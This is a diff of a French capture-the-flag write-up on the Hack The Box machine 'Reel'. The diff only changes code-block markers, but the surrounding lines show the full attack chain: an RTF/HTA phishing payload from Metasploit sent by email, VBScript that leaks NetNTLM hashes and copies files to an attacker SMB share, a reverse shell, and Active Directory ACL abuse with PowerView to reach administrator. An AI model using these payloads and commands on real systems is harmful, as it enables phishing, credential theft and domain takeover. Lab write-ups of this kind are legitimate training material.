@@ -17,7 +17,7 @@ Reel 2 Real
 
 Impossible de ne pas commencer sans le classique scan de ports :  
 
-```plain
+```
 Nmap scan report for 10.10.10.77
 Host is up (0.034s latency).
 
@@ -65,7 +65,7 @@ PORT   STATE SERVICE VERSION
 
 L'accès anonyme est autorisé sur le FTP :  
 
-```plain
+```
 Connected to 10.10.10.77.
 220 Microsoft FTP Service
 Name (10.10.10.77:devloop): anonymous
@@ -97,7 +97,7 @@ Dans le readme on peut lire le texte suivant :
 
 Le document sur AppLocker est plutôt concis :  
 
-```plain
+```
 AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
 ```
 
@@ -114,7 +114,7 @@ Move It!
 
 Si on recherche RTF dans Metasploit on trouve entre autres le module *windows/fileformat/office\_word\_hta*. Ce dernier génère un RTF qui provoque le chargement d'un fichier HTA externe. Ce HTA contient des instructions VBA qui seront alors exécutées.  
 
-```plain
+```
 msf exploit(windows/fileformat/office_word_hta) > show options
 
 Module options (exploit/windows/fileformat/office_word_hta):
@@ -149,13 +149,13 @@ msf exploit(windows/fileformat/office_word_hta) > exploit -j
 
 On utilise alors *sendemail* pour envoyer le fichier :  
 
-```plain
+```
 sudo sendemail -t nico@megabank.com -u "New procedure" -m "Hi Nicolas. Here is a new procedure" -a /tmp/new procedure.rtf -s 10.10.10.77 -f ariel@megabank.com -v
 ```
 
 Et comme on pouvait s'y attendre ça merdouille avec la présence d'AppLocker :  
 
-```plain
+```
 msf exploit(windows/fileformat/office_word_hta) > 
 [*] Started reverse SSL handler on 10.10.14.2:445 
 [+] /tmp/new procedure.rtf stored at /root/.msf4/local/newprocedure.rtf
@@ -166,7 +166,7 @@ msf exploit(windows/fileformat/office_word_hta) >
 
 Bien sûr les opérations plus basiques fonctionnent... On peut par exemple exfiltrer le hash NetNTLM de l'utilisateur avec le VBA suivant (on garde le même RTF généré par MSF, il nous suffit d'éditer le HTA) :  
 
-```plain
+```
 <script language="VBScript">
   window.moveTo -4000, -4000
   Set wzPUNP = CreateObject("Wscript.Shell")
@@ -178,7 +178,7 @@ Bien sûr les opérations plus basiques fonctionnent... On peut par exemple exfi
 
 On peut capturer ce hash avec le module de Metasploit :  
 
-```plain
+```
 msf auxiliary(server/capture/smb) > exploit -j
 [*] Auxiliary module running as background job 18.
 
@@ -194,7 +194,7 @@ NT_CLIENT_CHALLENGE:01010000000000002e367305d312d40135120fd8899414f4000000000200
 
 Ou encore à l'aide de Responder :  
 
-```plain
+```
 Responder
 [+] Listening for events...
 [SMBv2] NTLMv2-SSP Client   : 10.10.10.77
@@ -206,7 +206,7 @@ Malheureusement on ne vas pas bien loin avec ça... le mot de passe est suffisam
 
 En utilisant SMB on peut par exemple accéder au premier flag en le copiant simplement chez nous:  
 
-```plain
+```
 <script language="VBScript">
   window.moveTo -4000, -4000
   Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -219,7 +219,7 @@ En utilisant SMB on peut par exemple accéder au premier flag en le copiant simp
 
 Pour mettre en place un partage SMB sans trop de prise de tête, *Impacket* est fort utile :  
 
-```plain
+```
 devloop@kali:/tmp$ sudo impacket-smbserver public jail/
 Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 
@@ -252,7 +252,7 @@ Pour plus de détails plusieurs de ces exemples sont décrits [sur le blog pente
 
 J'ai tenté sans succès [la technique installutil.exe](https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/) :  
 
-```plain
+```
 <script language="VBScript">
   window.moveTo -4000, -4000
   Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -281,7 +281,7 @@ J'ai tenté sans succès [la technique installutil.exe](https://pentestlab.blog/
 
 Il est plus simple d'obtenir [un reverse shell basique](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5) en appelant un script Powershell sans l'extension ps1 :  
 
-```plain
+```
 <script language="VBScript">
   window.moveTo -4000, -4000
   Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -294,7 +294,7 @@ Il est plus simple d'obtenir [un reverse shell basique](https://gist.github.com/
 
 J'ai finalement pu obtenir via session *Meterpreter* avec *web\_delivery* puis trouver mon bonheur parmi les modules d'énumération locale:  
 
-```plain
+```
 msf exploit(multi/script/web_delivery) > show options
 
 Module options (exploit/multi/script/web_delivery):
@@ -383,7 +383,7 @@ On trouve dans le dossier de notre utilisateur nico un fichier *cred.xml* que vo
 
 Il s'agit en quelque sorte d'un format de sérialisation pour un identifiant utilisable dans Powershell. Tenter de copier le fichier pour l'utiliser localement semble assez compliqué, d'abord parce qu'il est lié à d'autres clés RSA présentes sur la machine et visiblement un simple copier / coller ne suffit pas... J'ai pas cherché à aller plus loin.  
 
-```plain
+```
 devloop@kali:~/Documents$ ssh nico@10.10.10.77
 The authenticity of host '10.10.10.77 (10.10.10.77)' can't be established.
 ECDSA key fingerprint is SHA256:jffiqnVqz/MrcDasdsjISFIcN/xtlDj1C76Yu1mDQVY.
@@ -413,7 +413,7 @@ On peut ainsi passer de Nico à Tom. Qu'est-ce qu'on y gagne ?
 
 Nico avait les groupes suivants :  
 
-```plain
+```
 Local Group Memberships      *Performance Monitor U*Print Operators      
 Global Group memberships     *AppLocker_Test       *Domain Users         
                              *MegaBank_Users       *DR_Site              
@@ -422,7 +422,7 @@ Global Group memberships     *AppLocker_Test       *Domain Users
 
 Et pour ce qui est de Tom :  
 
-```plain
+```
 Local Group Memberships      *Print Operators      
 Global Group memberships     *Domain Users         *SharePoint_Admins    
                              *MegaBank_Users       *DR_Site              
@@ -436,7 +436,7 @@ Go On Move
 
 Le plus intéressant une fois connecté avec Tom c'est la présence d'une note laissé dans un dossier *AD Audit* :  
 
-```plain
+```
 tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt                                                                            
 Findings:                                                                                                                       
 
@@ -451,7 +451,7 @@ Et dans ce dossier se trouve une copie de *BloodHound* qui n'attend plus que nou
 
 Bloodhound a donc une partie graphique. L'autre partie permet de générer les CSV à partir desquels les graphes seront générés :  
 
-```plain
+```
 tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>powershell -nop -exec bypass                                        
 Windows PowerShell                                                                                                              
 Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
@@ -475,7 +475,7 @@ On dispose ici du droit *writeOwner* qui permet de définir qui est le propriét
 
 C'est aussi possible de retrouver cette relation directement avec PowerView :  
 
-```plain
+```
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Get-DomainObjectACL -Identity Claire -ResolveGUIDS | ? {$_.SecurityIdentifier -match $(ConvertTo-SID tom)}                                                                                                         
 AceType               : AccessAllowed                                                                                           
 ObjectDN              : CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL                                                                
@@ -498,7 +498,7 @@ Pour exploiter cela on a recours à la commande *Set-DomainObjectOwner* de Power
 
 PowerSploit dispose de [la documentation de référence](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObjectOwner/) pour la commande.  
 
-```plain
+```
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1 
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                          
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights All
@@ -555,7 +555,7 @@ Si on se rencarde un peu [sur ce type de groupe](https://ss64.com/nt/syntax-secu
 
 On peut alors s'octroyer les privilèges d'ajout de membre et nous ajouter au groupe :  
 
-```plain
+```
 PS C:\temp> Add-DomainObjectAcl -TargetIdentity Backup_Admins -PrincipalIdentity claire -Rights WriteMembers
 PS C:\temp> net group Backup_Admins claire /add
 The command completed successfully.
@@ -563,7 +563,7 @@ The command completed successfully.
 
 Mais déception : bien que l'on dispose des droits sur le dossier personnel de l'administrateur :  
 
-```plain
+```
 claire@REEL C:\Users>icacls Administrator
 Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)
               HTB\Backup_Admins:(OI)(CI)(F)
@@ -577,7 +577,7 @@ Plusieurs scripts Powershell sont présents dans un sous-dossier *Backup Scripts
 
 J'ai eu la bonne idée de faire un diff sur les fichiers ps1 présents et ceux du zip :  
 
-```plain
+```
 devloop@kali:~/Documents/reel/Backup Scripts$ diff BackupScript.ps1 yolo/BackupScript.ps1
 1,2c1,41
 < # admin password
@@ -587,7 +587,7 @@ devloop@kali:~/Documents/reel/Backup Scripts$ diff BackupScript.ps1 yolo/BackupS
 
 Et enfin on peut passer administrateur et accéder au flag :  
 
-```plain
+```
 administrator@REEL C:\Users\Administrator\Desktop>type root.txt
 1018a0331e686176ff4577c728eaf32a
 ```
